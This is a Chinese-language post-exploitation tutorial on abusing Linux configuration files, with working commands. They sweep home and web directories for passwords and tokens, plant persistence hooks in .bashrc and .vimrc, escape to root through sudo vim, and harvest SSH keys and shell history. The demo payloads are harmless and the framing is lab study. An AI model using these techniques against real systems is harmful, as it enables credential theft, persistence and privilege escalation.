# Linux 配置文件利用与权限维持

本文件合并了原来的配置文件利用、配置文件完整指南和配置文件后门入门指南内容。旧文件已归档到 `_archive\2026-05-07-深度优化`。

## 这篇文档解决什么问题

Linux 的很多行为都由文本配置文件控制。拿到 shell 后，你经常能通过配置文件获得三类收益：

1. 发现凭证和内网线索。
2. 建立低噪音权限维持。
3. 借用户或管理员的正常操作触发代码执行。

## 先理解 dotfiles

dotfiles 是以点开头的隐藏配置文件，例如：

```text
.bashrc
.bash_profile
.profile
.vimrc
.ssh/config
.gitconfig
```

它们通常位于用户主目录，控制 shell、编辑器、SSH、Git 等工具行为。

## 配置文件枚举清单

```bash
ls -la ~
find /home -maxdepth 3 -type f -name ".*" 2>/dev/null
find /home -maxdepth 4 -type f \( -name "*.conf" -o -name "*.ini" -o -name "*.yml" -o -name "*.yaml" \) 2>/dev/null
grep -RniE "password|passwd|secret|token|apikey|api_key|credential" /home /opt /var/www 2>/dev/null | head -100
```

重点目录：

| 目录 | 可能内容 |
|---|---|
| `/home/*` | 用户配置、历史命令、SSH 材料 |
| `/var/www` | Web 应用配置、数据库账号 |
| `/opt` | 第三方软件、部署脚本 |
| `/etc` | 系统配置、服务配置 |
| `/var/log` | 命令输出、服务日志、泄露凭证 |

## `.bashrc` 和 `.bash_profile`

### 执行时机

| 文件 | 什么时候执行 |
|---|---|
| `.bash_profile` | 登录 shell，例如 SSH 登录 |
| `.bashrc` | 交互式非登录 shell，例如新开 bash |
| `.profile` | 更通用的登录配置，取决于 shell |

### 最小验证

```bash
echo 'touch /tmp/bashrc_test' >> ~/.bashrc
bash
ls -l /tmp/bashrc_test
```

如果文件没有出现，先排查：

```text
当前 shell 是否读取 .bashrc
写入的是不是当前用户的 home
是否有语法错误导致后续不执行
```

### 权限维持思路

在实验环境中可以用 `.bashrc` 调用隐藏脚本：

```bash
echo 'source ~/.local_profile' >> ~/.bashrc
cat > ~/.local_profile << 'EOF'
# 这里放需要触发的动作
touch /tmp/profile_triggered
EOF
chmod 600 ~/.local_profile
```

学习重点不是命令本身，而是触发模型：

```text
用户打开 shell -> shell 读取配置 -> 配置调用脚本 -> 动作执行
```

## VIM 配置文件

### 为什么 VIM 重要

VIM 几乎到处都有，管理员常用它编辑配置。如果用户的 VIM 配置被修改，那么打开 VIM 时就可能触发命令。

常见位置：

```text
~/.vimrc
~/.vim/plugin/*.vim
/etc/vim/vimrc
```

### 最小验证

```bash
echo ':silent !touch /tmp/vim_triggered' >> ~/.vimrc
vim /tmp/testfile
ls -l /tmp/vim_triggered
```

### 插件目录

```bash
mkdir -p ~/.vim/plugin
cat > ~/.vim/plugin/settings.vim << 'EOF'
:silent !touch /tmp/vim_plugin_triggered
EOF
```

### sudo vim 风险

如果 `sudo -l` 显示用户可以运行 VIM：

```bash
sudo -l
```

例如：

```text
(root) NOPASSWD: /usr/bin/vim /opt/important.conf
```

这可能导致 root 级执行。VIM 内部可以：

```vim
:shell
```

或者执行 shell 命令：

```vim
:!id
```

注意：不同发行版和 sudo 配置对环境变量、配置读取行为不同。不要假设每台机器都一样。

## SSH 配置与密钥

### 你要找什么

```bash
ls -la ~/.ssh
cat ~/.ssh/config 2>/dev/null
cat ~/.ssh/known_hosts 2>/dev/null
cat ~/.ssh/authorized_keys 2>/dev/null
find /home -maxdepth 3 -name "id_*" -o -name "*.pem" 2>/dev/null
```

### 私钥判断

如果私钥包含：

```text
Proc-Type: 4,ENCRYPTED
DEK-Info: ...
```

说明它有口令保护，需要考虑破解或找口令来源。

### SSH 配置里的线索

| 字段 | 意义 |
|---|---|
| `Host` | 常用目标别名 |
| `HostName` | 真实目标 |
| `User` | 默认登录用户 |
| `IdentityFile` | 使用的私钥 |
| `ProxyJump` | 跳板机 |
| `ForwardAgent` | Agent 转发 |
| `ControlMaster` | 连接复用 |

## 历史命令

```bash
cat ~/.bash_history
history
grep -RniE "ssh|mysql|psql|password|token|ansible|kinit|scp" /home/*/.*history 2>/dev/null
```

历史命令经常暴露：

```text
登录目标
私钥路径
数据库密码
Ansible 命令
Kerberos 命令
部署脚本路径
```

## 应用配置文件

查找 Web 和服务配置：

```bash
grep -RniE "DB_|DATABASE|MYSQL|POSTGRES|PASSWORD|SECRET|TOKEN" /var/www /opt 2>/dev/null | head -100
find /var/www /opt -type f \( -name ".env" -o -name "config.*" -o -name "*.yml" -o -name "*.yaml" \) 2>/dev/null
```

常见收获：

| 文件 | 可能内容 |
|---|---|
| `.env` | 数据库账号、API Token |
| `config.php` | Web 应用数据库连接 |
| `settings.py` | Django 密钥、数据库 |
| `application.yml` | Spring 配置 |
| `docker-compose.yml` | 服务账号、端口、卷挂载 |

## 清理和报告

学习后渗透时，别只关注“能不能做”。报告里也要记录：

```text

触发条件是什么
以哪个用户执行
获得了什么权限或访问能力
如何恢复原状
```
